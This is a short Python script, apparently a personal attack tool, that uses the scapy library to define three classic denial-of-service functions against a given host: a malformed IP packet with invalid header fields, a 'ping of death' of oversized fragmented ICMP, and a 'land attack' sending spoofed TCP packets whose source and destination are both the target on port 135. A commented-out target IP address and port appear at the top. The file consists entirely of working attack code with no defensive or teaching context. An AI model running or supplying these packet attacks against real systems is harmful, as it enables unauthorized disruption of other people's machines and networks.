#!/usr/bin/python3
from scapy.all import *
#destination = "155.248.226.213"
#dport = 22

def malformed_packet_attack(host):
    send(IP(dst=host, ihl=2, version=3)/ICMP())
def ping_of_death_attack(host):
    send(fragment (IP(dst=host)/ICMP()/("X"*60000)))
def land_attack(host):
    send(IP(src=host, dst=host)/TCP(sport=135,dport=135))
    